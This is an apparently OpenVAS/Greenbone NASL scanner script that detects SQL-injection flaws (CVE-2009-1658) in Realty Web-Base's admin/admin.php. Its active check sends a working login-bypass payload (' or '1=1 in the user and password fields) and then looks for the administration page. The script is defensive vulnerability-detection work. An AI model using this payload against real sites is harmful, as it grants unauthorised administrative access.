# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100195");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2009-05-10 17:01:14 +0200 (Sun, 10 May 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1658");

  script_name("Realty Web-Base 'admin/admin.php' Multiple SQL Injection Vulnerabilities");

  script_category(ACT_GATHER_INFO);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("realty_web_base_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("realtywebbase/detected");

  script_tag(name:"summary", value:"Realty Web-Base is prone to multiple SQL-injection vulnerabilities
  because it fails to sufficiently sanitize user-supplied data before using it in a SQL query.");

  script_tag(name:"impact", value:"Exploiting these issues can allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying database.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34886");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("version_func.inc");

port = http_get_port(default:80);
if(!version = get_kb_item(string("www/", port, "/RealtyWebBase")))
  exit(0);

if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))
  exit(0);

vers = matches[1];
dir  = matches[2];

if(vers && "unknown" >!< vers) {

  if(version_is_equal(version: vers, test_version: "1.0")) {
     security_message(port:port);
     exit(0);
  }
} else {

  variables = string("user=%27%20or%20%271=1&password=%27%20or%20%271=1");
  filename = string(dir,"/admin/admin.php");
  host = http_host_name( port:port );

  req = string(
              "POST ", filename, " HTTP/1.1\r\n",
              "Referer: ","http://", host, filename, "\r\n",
              "Host: ", host, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(variables),
              "\r\n\r\n",
              variables
            );

  result = http_send_recv(port:port, data:req, bodyonly:FALSE);
  if( result == NULL )exit(0);

  if(egrep(pattern:"Realty Web-Base: Administration Center", string:result)) {
    security_message(port:port);
    exit(0);
  }

}

exit(99);
